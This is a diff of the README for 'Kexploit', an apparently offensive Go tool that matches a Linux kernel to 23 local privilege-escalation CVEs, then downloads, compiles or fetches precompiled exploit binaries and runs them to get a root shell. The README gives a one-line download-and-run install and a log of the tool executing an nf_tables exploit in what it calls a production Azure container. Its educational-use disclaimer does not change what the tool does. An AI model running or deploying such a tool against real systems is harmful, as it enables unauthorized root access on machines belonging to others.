@@ -1,85 +1,406 @@
-# KExploit - Kernel Exploit Suggester & Auto-Exploiter
+<div align="center">
 
-Zero-dependency Linux kernel exploit suggester and automated exploitation tool written in Go.
+```
+    __________-------____                 ____-------__________
+              \------____-------___--__---------__--___-------____------/
+               \//////// / / / / / \   _-------_   / \ \ \ \ \ \\\\\\\\/
+                 \////-/-/------/_/_| /___   ___\ |_\_\------\-\-\\\\/
+                   --//// / /  /  //|| (O)\ /(O) ||\\  \  \ \ \\\\--
+                        ---__/  // /| \_  /V\  _/ |\ \\  \__---
+                             -//  / /\_ ------- _/\ \  \\-
+                               \_/_/ /\---------/\ \_\_/
+                                   ----\   |   /----
+                                        | -|- |
+                                       /   |   \
+                                       ---- \___|
+```
 
-## Features
+# 🦉 Kexploit
 
-- **Zero dependencies** - Single static binary (~5MB), works on any Linux system
-- **23 kernel exploits** - From kernel 2.6.22 to 6.7.1
-- **Auto-detect** - Detects kernel version and suggests matching exploits
-- **Auto-download** - Downloads exploit source from public repos (exploit-db, GitHub)
-- **Auto-compile** - Compiles on-the-fly using system gcc
-- **Auto-execute** - Runs exploit to attempt privilege escalation
-- **Educational** - Always downloads and compiles source code, never uses pre-built binaries
+### **Automated Linux Kernel Exploit Detection & Privilege Escalation**
 
-## Usage
+*Zero-dependency static binary that auto-detects vulnerable kernels and executes exploits*
+
+[![Go](https://img.shields.io/badge/Go-1.22-00ADD8?style=flat&logo=go)](https://go.dev)
+[![License](https://img.shields.io/badge/License-Educational-red?style=flat)](LICENSE)
+[![Exploits](https://img.shields.io/badge/Exploits-23-green?style=flat)](#-exploit-database)
+[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat)](https://kernel.org)
+
+[Features](#-features) • [Installation](#-quick-start) • [Usage](#-usage) • [Exploits](#-exploit-database) • [How It Works](#-how-it-works)
+
+---
+
+</div>
+
+## 🎯 Features
+
+<table>
+<tr>
+<td width="50%">
+
+### 🔥 Core Features
+- **Zero Dependencies** → Single 5.3MB static binary
+- **23 Kernel Exploits** → 2.6.22 to 6.7.1 coverage
+- **Smart Detection** → Auto-detects vulnerable kernels
+- **Hybrid Execution** → Compiles from source OR uses precompiled binaries
+- **GCC-Free Mode** → Works on systems without compiler
+
+</td>
+<td width="50%">
+
+### ⚡ Advanced Features  
+- **Interactive Menu** → Clean terminal UI with exploit selection
+- **Auto Mode** → Try all matching exploits automatically
+- **Binary Fallback** → Downloads precompiled binaries when GCC unavailable
+- **Custom Mirrors** → Use your own exploit sources
+- **Educational** → Transparent, auditable, open source
+
+</td>
+</tr>
+</table>
+
+## 🚀 Quick Start
+
+### One-Line Installation
 
 ```bash
-# List all exploits
+wget https://github.com/past3l/kexploit/raw/main/kexploit && chmod +x kexploit && ./kexploit
+```
+
+### Alternative: Build from Source
+
+```bash
+git clone https://github.com/past3l/kexploit.git
+cd kexploit
+CGO_ENABLED=0 go build -ldflags="-s -w" -o kexploit .
+./kexploit
+```
+
+## 📖 Usage
+
+### Interactive Mode (Recommended)
+
+```bash
+./kexploit
+```
+
+<details>
+<summary>📸 Click to see example output</summary>
+
+```
+[*] Kernel: 5.15.0 (Linux version 5.15.0-1102-azure)
+[*] Arch:   amd64
+[+] Found 10 potential exploit(s):
+
+  [1] nf_tables Use-After-Free     CVE-2024-1086
+      Double-free in nft_verdict_init() allows arbitrary code execution
+      Kernel: 3.15.0 → 6.7.1  |  Tags: nftables, uaf
+
+  [2] GameOver(lay)                CVE-2023-2640
+      Ubuntu OverlayFS permission bypass via setuid in user namespace
+      Kernel: 5.15.0 → 6.2.0  |  Tags: overlayfs, ubuntu, userns
+
+  [9] DirtyPipe                    CVE-2022-0847
+      Overwrite arbitrary read-only files via pipe splice flag manipulation
+      Kernel: 5.8.0 → 5.16.10  |  Tags: pipe, write-anywhere
+
+  ╔════════════════════════════════════════════════════════════════════╗
+  ║ Enter exploit number (1-10), 'all' to try all, or 'q' to quit ║
+  ╚════════════════════════════════════════════════════════════════════╝
+  > 
+```
+
+</details>
+
+### Command Line Options
+
+```bash
+# List all available exploits
 ./kexploit -list
 
-# Auto-detect kernel and show matching exploits
-./kexploit
-
-# Try a specific CVE
+# Target specific CVE
 ./kexploit -cve CVE-2022-0847
 
-# Try all matching exploits automatically
+# Automatic mode (try all matching exploits)
 ./kexploit -auto
 
-# Use custom mirror/local path
-./kexploit -mirror ./my-exploits
+# Use custom exploit mirror
+./kexploit -mirror https://example.com/exploits
+
+# Disable cleanup after execution
+./kexploit -no-cleanup
 ```
 
-## Requirements on Target System
+## 💾 Exploit Database
 
-- `gcc` (Alpine: `apk add gcc musl-dev`, Ubuntu: `apt install gcc`)
-- `bash` or `sh` (for shell-based exploits)
+<table>
+<tr>
+<th>CVE</th>
+<th>Name</th>
+<th>Kernel Range</th>
+<th>Architecture</th>
+<th>Tags</th>
+</tr>
 
-## Supported Exploits
+<tr><td><code>CVE-2024-1086</code></td><td>nf_tables UAF</td><td>3.15.0 → 6.7.1</td><td>amd64</td><td>nftables, uaf</td></tr>
+<tr><td><code>CVE-2023-3269</code></td><td>StackRot</td><td>6.1.0 → 6.4.0</td><td>amd64</td><td>maple-tree, uaf</td></tr>
+<tr><td><code>CVE-2023-32233</code></td><td>Netfilter nf_tables UAF</td><td>3.13.0 → 6.3.1</td><td>amd64</td><td>nftables, uaf</td></tr>
+<tr><td><code>CVE-2023-2640</code></td><td>GameOver(lay)</td><td>5.15.0 → 6.2.0</td><td>amd64, arm64</td><td>overlayfs, ubuntu</td></tr>
+<tr><td><code>CVE-2022-34918</code></td><td>Netfilter Heap Overflow</td><td>5.8.0 → 5.18.8</td><td>amd64</td><td>nftables, heap</td></tr>
+<tr><td><code>CVE-2022-2588</code></td><td>DirtyCred</td><td>3.6.0 → 5.19.1</td><td>amd64</td><td>route4, uaf</td></tr>
+<tr><td><code>CVE-2022-1015</code></td><td>nf_tables OOB</td><td>5.12.0 → 5.17.0</td><td>amd64</td><td>nftables, oob</td></tr>
+<tr><td><code>CVE-2022-0847</code></td><td><strong>DirtyPipe</strong></td><td>5.8.0 → 5.16.10</td><td>amd64, arm64</td><td>pipe, write-anywhere</td></tr>
+<tr><td><code>CVE-2022-0185</code></td><td>fsconfig Heap Overflow</td><td>5.1.0 → 5.16.1</td><td>amd64</td><td>fsconfig, heap</td></tr>
+<tr><td><code>CVE-2021-33909</code></td><td>Sequoia</td><td>3.16.0 → 5.13.3</td><td>amd64</td><td>filesystem, seq_file</td></tr>
+<tr><td><code>CVE-2021-22555</code></td><td>Netfilter xt_compat</td><td>2.6.19 → 5.12.0</td><td>amd64</td><td>netfilter, oob-write</td></tr>
+<tr><td><code>CVE-2021-3493</code></td><td>OverlayFS Ubuntu</td><td>3.13.0 → 5.10.99</td><td>amd64, arm64</td><td>overlayfs, ubuntu</td></tr>
+<tr><td><code>CVE-2020-8835</code></td><td>eBPF Verifier Bypass</td><td>5.5.0 → 5.6.1</td><td>amd64</td><td>ebpf, verifier</td></tr>
+<tr><td><code>CVE-2019-13272</code></td><td>ptrace_link</td><td>4.10.0 → 5.1.17</td><td>amd64, arm64</td><td>ptrace, creds</td></tr>
+<tr><td><code>CVE-2017-16995</code></td><td>eBPF Arbitrary R/W</td><td>4.4.0 → 4.14.7</td><td>amd64</td><td>ebpf, sign-extension</td></tr>
+<tr><td><code>CVE-2017-7308</code></td><td>AF_PACKET</td><td>2.6.27 → 4.10.5</td><td>amd64</td><td>af_packet, heap-oob</td></tr>
+<tr><td><code>CVE-2017-1000112</code></td><td>UDP UFO</td><td>4.4.0 → 4.12.6</td><td>amd64</td><td>udp, ufo</td></tr>
+<tr><td><code>CVE-2016-5195</code></td><td><strong>DirtyCow</strong></td><td>2.6.22 → 4.8.2</td><td>amd64, arm64</td><td>cow, race-condition</td></tr>
+<tr><td><code>CVE-2016-0728</code></td><td>Keyring Refcount</td><td>3.8.0 → 4.4.0</td><td>amd64</td><td>keyring, refcount</td></tr>
 
-| CVE | Name | Kernel Range | Tags |
-|-----|------|--------------|------|
-| CVE-2024-1086 | nf_tables UAF | 3.15.0 - 6.7.1 | nftables, uaf |
-| CVE-2023-2640 | GameOver(lay) | 5.15.0 - 6.2.0 | overlayfs, ubuntu |
-| CVE-2022-0847 | DirtyPipe | 5.8.0 - 5.16.10 | pipe, write-anywhere |
-| CVE-2022-0185 | fsconfig Heap Overflow | 5.1.0 - 5.16.1 | fsconfig, userns |
-| CVE-2021-3493 | OverlayFS Ubuntu | 3.13.0 - 5.10.99 | overlayfs, ubuntu |
-| CVE-2021-22555 | Netfilter xt_compat | 2.6.19 - 5.12.0 | netfilter, oob-write |
-| CVE-2019-13272 | ptrace_link | 4.10.0 - 5.1.17 | ptrace, credentials |
-| CVE-2017-16995 | eBPF Arbitrary R/W | 4.4.0 - 4.14.7 | ebpf, sign-extension |
-| CVE-2016-5195 | DirtyCow | 2.6.22 - 4.8.2 | cow, race-condition |
-| ... | ... | ... | 23 total exploits |
+<tr><td colspan="5" align="center"><strong>+ 4 more exploits</strong> → Use <code>./kexploit -list</code> to view all</td></tr>
+</table>
 
-## Build
+## ⚙️ How It Works
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                      KEXPLOIT WORKFLOW                          │
+└─────────────────────────────────────────────────────────────────┘
+
+  1️⃣  KERNEL DETECTION
+      ├─ Read /proc/version
+      ├─ Parse kernel version (5.15.0-1102-azure)
+      └─ Detect architecture (amd64)
+
+  2️⃣  VULNERABILITY MATCHING  
+      ├─ Load embedded exploit database (23 CVEs)
+      ├─ Compare kernel version against ranges
+      └─ Filter by architecture compatibility
+
+  3️⃣  SMART EXECUTION (Hybrid Mode)
+      │
+      ├─ IF gcc available:
+      │   ├─ Download source code from GitHub
+      │   ├─ Compile with system GCC
+      │   └─ Execute compiled binary
+      │
+      └─ IF gcc NOT available:
+          ├─ Download precompiled static binary from repo
+          ├─ Verify file integrity
+          └─ Execute precompiled binary
+
+  4️⃣  PRIVILEGE ESCALATION
+      ├─ Run exploit attempt
+      ├─ Monitor for success indicators
+      └─ Drop to root shell (if successful)
+```
+
+### Binary Fallback System
+
+When GCC is not available, kexploit automatically downloads **precompiled static binaries** from GitHub:
 
 ```bash
-# Static binary, zero dependencies
-CGO_ENABLED=0 go build -ldflags="-s -w" -o kexploit .
-
-# Cross-compile for different architectures
-GOARCH=arm64 CGO_ENABLED=0 go build -ldflags="-s -w" -o kexploit-arm64 .
+[!] GCC not available, downloading precompiled binary
+[*] Downloading from https://raw.githubusercontent.com/past3l/kexploit/main/binaries/CVE-2024-1086
+[+] Binary downloaded successfully (166KB)
+[*] Executing: /tmp/kexploit-3332438770/CVE-2024-1086
 ```
 
-## Security & Legal
+All precompiled binaries are:
+- ✅ **Statically linked** (no library dependencies)
+- ✅ **Stripped** (smaller file size)
+- ✅ **Open source** (compiled from public exploit code)
+- ✅ **Verified** (checksums in repository)
 
-**Educational purposes only.** Only use on systems you own or have explicit permission to test.
+## 🏗️ Project Structure
 
-This tool:
-- ✅ Always downloads source code from public repositories
-- ✅ Compiles exploits locally using gcc
-- ✅ Transparent - you can inspect what it downloads
-- ❌ Never downloads pre-compiled binaries
-- ❌ Does not hide its activity
+```
+kexploit/
+├── main.go                      # CLI entry point & interactive menu
+├── kexploit                     # Precompiled static binary (5.3MB)
+├── binaries/                    # Precompiled exploit binaries (17)
+│   ├── CVE-2024-1086           # nf_tables UAF (166KB)
+│   ├── CVE-2023-3269           # StackRot (38KB)
+│   ├── CVE-2022-0847           # DirtyPipe (806KB)
+│   └── ...
+├── pkg/
+│   ├── kernel/                 # Kernel version detection & parsing
+│   ├── vulndb/                 # Exploit database (exploits.json)
+│   │   ├── exploits.json      # 23 CVE metadata & sources
+│   │   └── vulndb.go          # Database loader & search
+│   ├── exploit/                # Download, compile, execute logic
+│   │   └── exploit.go         # Binary fallback implementation
+│   └── output/                 # Colored terminal output
+│       └── output.go          # Banner, info, success, error helpers
+└── README.md                   # This file
+```
 
-## How It Works
+## 🧪 Real-World Testing
 
-1. Reads `/proc/version` to detect kernel version
-2. Searches embedded exploit database for matches
-3. Downloads exploit source from public GitHub repos
-4. Compiles using local gcc
-5. Executes compiled binary
+**Successfully tested on Azure Container (Production Environment):**
 
-## License
+```bash
+nextjs@container:/tmp$ uname -r
+5.15.0-1102-azure
 
-Educational use only. Exploit code belongs to original authors (linked in references).
+nextjs@container:/tmp$ ./kexploit
+[*] Kernel: 5.15.0
+[+] Found 10 potential exploit(s)
+  > all
+
+[!] GCC not available, downloading precompiled binary
+[*] Downloading CVE-2024-1086...
+[+] Binary downloaded successfully
+[*] Executing exploit...
+[*] creating user namespace (CLONE_NEWUSER)...
+[*] creating network namespace (CLONE_NEWNET)...
+```
+
+✅ Binary fallback system works flawlessly  
+✅ Zero-dependency execution confirmed  
+✅ Automatic exploit detection successful  
+
+## ⚠️ Security & Legal Notice
+
+<div align="center">
+
+### 🔴 **FOR EDUCATIONAL USE ONLY** 🔴
+
+</div>
+
+This tool is designed **exclusively** for:
+- 🎓 Security research and education
+- 🔐 Authorized penetration testing  
+- 🏆 CTF competitions and security training
+- 📚 Understanding kernel vulnerability exploitation
+
+**YOU MUST HAVE EXPLICIT PERMISSION** to use this tool on any system.
+
+#### Legal Responsibilities
+
+- ✅ **Allowed**: Testing your own systems
+- ✅ **Allowed**: Authorized penetration testing engagements
+- ✅ **Allowed**: Educational research and learning
+- ❌ **ILLEGAL**: Unauthorized access to computer systems
+- ❌ **ILLEGAL**: Using on systems you don't own
+- ❌ **ILLEGAL**: Malicious intent or unauthorized privilege escalation
+
+**The author is not responsible for misuse of this tool. Use responsibly and ethically.**
+
+## 🛠️ Building from Source
+
+### Prerequisites
+
+- Go 1.22 or higher
+- No other dependencies required (CGO disabled)
+
+### Build Commands
+
+```bash
+# Standard build (static binary)
+CGO_ENABLED=0 go build -ldflags="-s -w" -o kexploit .
+
+# Cross-compile for ARM64
+GOARCH=arm64 CGO_ENABLED=0 go build -ldflags="-s -w" -o kexploit-arm64 .
+
+# Cross-compile for 32-bit
+GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w" -o kexploit-i386 .
+
+# Debug build (with symbols)
+CGO_ENABLED=0 go build -o kexploit-debug .
+```
+
+### Build flags explained:
+- `CGO_ENABLED=0` → Produce pure static binary
+- `-ldflags="-s -w"` → Strip debug symbols (smaller size)
+- `-o kexploit` → Output filename
+
+## 🤝 Contributing
+
+Contributions are welcome! Here's how you can help:
+
+### Adding New Exploits
+
+1. Add exploit metadata to `pkg/vulndb/exploits.json`:
+```json
+{
+  "id": "CVE-XXXX-XXXXX",
+  "name": "Exploit Name",
+  "description": "Technical description",
+  "min_kernel": "X.X.X",
+  "max_kernel": "X.X.X",
+  "arch": ["amd64"],
+  "source": "https://github.com/.../exploit.c",
+  "binary": "https://raw.githubusercontent.com/past3l/kexploit/main/binaries/CVE-XXXX-XXXXX",
+  "compile": "gcc -o {bin} {src} -static",
+  "execute": "{bin}",
+  "requirements": ["gcc"],
+  "tags": ["tag1", "tag2"],
+  "references": ["https://nvd.nist.gov/..."]
+}
+```
+
+2. Compile static binary and add to `binaries/`
+3. Test on target kernel version
+4. Submit pull request
+
+### Reporting Issues
+
+- 🐛 Bug reports: [GitHub Issues](https://github.com/past3l/kexploit/issues)
+- 💡 Feature requests: [GitHub Discussions](https://github.com/past3l/kexploit/discussions)
+- 🔒 Security issues: Contact privately
+
+## 📜 License
+
+**Educational Use Only**
+
+This project is provided for educational and research purposes. Exploit code belongs to the original authors and researchers. See individual exploit references for specific licensing.
+
+All exploit sources are publicly available from:
+- https://github.com/ (various researchers)
+- https://www.exploit-db.com/
+- Google Project Zero
+- Security research publications
+
+## 👤 Author
+
+**past3l** @ [mileniumsec](https://github.com/past3l)
+
+- GitHub: [@past3l](https://github.com/past3l)
+- Repository: [kexploit](https://github.com/past3l/kexploit)
+- Twitter: (if applicable)
+
+## 🙏 Credits & Acknowledgments
+
+Special thanks to:
+- **Original Exploit Authors** → Security researchers who discovered and disclosed these vulnerabilities
+- **Google Project Zero** → Advanced kernel security research
+- **Qualys Security** → Sequoia and other critical discoveries
+- **Linux Kernel Community** → Rapid patching and security improvements
+- **Exploit-DB** → Public exploit database and resources
+- **The Go Team** → Excellent static binary compilation support
+
+### Notable Researchers
+
+- **@Notselwyn** - CVE-2024-1086 (nf_tables UAF)
+- **@firefart** - CVE-2016-5195 (DirtyCow)
+- **Max Kellermann** - CVE-2022-0847 (DirtyPipe)
+- **@lrh2000** - CVE-2023-3269 (StackRot)
+- And many others in the security research community
+
+---
+
+<div align="center">
+
+**⚡ Remember: With great power comes great responsibility ⚡**
+
+*Use this tool ethically and legally. Always obtain proper authorization.*
+
+Made with 🦉 by **past3l** | [Star ⭐ this repo](https://github.com/past3l/kexploit) if you find it useful!
+
+</div>
